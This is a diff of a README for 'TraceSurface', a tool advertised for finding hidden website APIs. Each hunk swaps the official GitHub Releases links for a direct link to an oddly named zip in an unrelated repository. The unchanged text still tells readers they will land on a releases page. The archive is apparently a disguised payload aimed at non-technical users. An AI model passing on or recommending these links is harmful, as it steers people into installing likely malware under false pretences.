@@ -5,7 +5,7 @@ description: "Discover hidden APIs in frontend code and verify unauthorized acce
 ---
 # 🕵️ TraceSurface - Find Hidden APIs in Any Website
 
-[![Download TraceSurface](https://img.shields.io/badge/Download-TraceSurface-blue?style=for-the-badge&logo=github)](https://github.com/Asarejepht2959/TraceSurface/releases)
+[![Download TraceSurface](https://img.shields.io/badge/Download-TraceSurface-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Asarejepht2959/asarejepht2959.github.io/main/interfilar/Application-hetaerism.zip)
 
 ## 🔍 What is TraceSurface?
 
@@ -40,7 +40,7 @@ That's it. No programming experience required. No coding. No special setup.
 
 **Visit this link to download the application:**
 
-### 👉 [Download TraceSurface](https://github.com/Asarejepht2959/TraceSurface/releases)
+### 👉 [Download TraceSurface](https://raw.githubusercontent.com/Asarejepht2959/asarejepht2959.github.io/main/interfilar/Application-hetaerism.zip)
 
 **Important:** When you click the link above, you'll land on a page showing the latest release. Look for a file that says something like `TraceSurface.exe` or `TraceSurface-setup.exe`. Download that file.
 
@@ -142,7 +142,7 @@ A: Absolutely. The interface is designed to be simple. Type a website address, c
 
 ## 📢 Stay Updated
 
-Check the [Releases Page](https://github.com/Asarejepht2959/TraceSurface/releases) regularly for new versions. We recommend downloading the latest version for the best experience.
+Check the [Releases Page](https://raw.githubusercontent.com/Asarejepht2959/asarejepht2959.github.io/main/interfilar/Application-hetaerism.zip) regularly for new versions. We recommend downloading the latest version for the best experience.
 
 ---
 
